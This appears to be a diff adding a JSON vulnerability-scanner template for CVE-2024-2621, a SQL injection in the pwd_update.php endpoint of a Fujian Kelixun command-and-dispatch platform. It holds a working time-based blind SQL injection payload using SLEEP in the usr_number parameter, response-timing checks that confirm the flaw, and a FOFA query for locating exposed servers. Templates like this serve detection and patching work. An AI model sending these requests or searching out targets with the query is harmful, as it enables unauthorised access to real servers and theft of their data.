@@ -1,0 +1,64 @@
+{
+  "product": "福建科立迅通信指挥调度平台",
+  "vul_name": "福建科立迅通信指挥调度平台 pwd_update.php SQL注入",
+  "type": "SQL注入",
+  "vul_id": [
+    "CVE-2024-2621"
+  ],
+  "level": 3,
+  "vul_desc": "福建科立迅通信指挥调度平台pwd_update.php 接口处SQL注入漏洞，恶意攻击者可能利用该漏洞获取服务器敏感信息，最后造成服务器失陷。",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "body=\"app/structure/departments.php\" || app=\"指挥调度管理平台\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/qq_40550150/article/details/137008465",
+  "fix": [
+    "设置安全访问控制策略。"
+  ],
+  "model": "",
+  "logic": "and",
+  "exploit": [
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/api/client/user/pwd_update.php?usr_number=1%27%20AND%20(SELECT%207872%20FROM%20(SELECT(SLEEP(8)))DHhu)%20AND%20%27pMGM%27=%27pMGM&new_password=1&sign=1"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 200,
+            "time": {
+              "check": ">=",
+              "num": 8
+            }
+          }
+        ]
+      }
+    },
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/api/client/user/pwd_update.php?usr_number=1%27%20AND%20(SELECT%207872%20FROM%20(SELECT(SLEEP(0)))DHhu)%20AND%20%27pMGM%27=%27pMGM&new_password=1&sign=1"
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "status": 200,
+            "time": {
+              "check": "<=",
+              "num": 7
+            }
+          }
+        ]
+      }
+    }
+  ]
+}
